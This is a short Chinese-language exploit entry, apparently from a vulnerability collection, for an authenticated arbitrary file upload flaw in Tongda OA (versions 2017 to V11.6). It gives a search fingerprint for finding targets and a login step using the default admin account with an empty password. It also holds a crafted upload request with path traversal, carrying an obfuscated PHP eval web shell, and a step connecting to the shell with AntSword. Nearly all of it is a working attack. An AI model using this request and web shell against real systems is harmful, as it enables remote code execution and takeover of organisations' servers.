# 通达OAutils存在后台任意文件上传

- **系统**：通达OA　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app.name="通达 OA"`
- **请求**：`POST /general/data_center/utils/upload.php?action=upload&filetype=nmsl&repkid=/.%3C%3E./.%3C%3E./.%3C%3E./ HTTP/1.1`

**请求体 / payload**
```
1. 使用默认密码admin，密码为空或采用通达OA任意用户登录登录后台；
2. 通过获取的`cookie`上传文件
Accept-Charset: GBK
Cookie: PHPSESSID=bdvsg4irn4bm2c34s9pr86kr35;_SERVER=
Content-Type: multipart/form-data; boundary=********
Host: xx.xx.xx.xx
Content-Length: 225
--********
Content-Disposition: form-data; name="FILE1"; filename="shell1.php"
<?php class Gz5SfY10 { public function __construct($H7Es8){ @eval("/*Z7y11Eib8N*/".$H7Es8.""); }}new Gz5SfY10($_REQUEST['x']);?>
--********
3. 上传文件位置：`http://xx.xx.xx.xx/_shell.php`,使用蚁剑成功连接
```

**其他**
- 通达OA utils存在后台任意文件上传: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 通达OA2017 -通达OAV11.6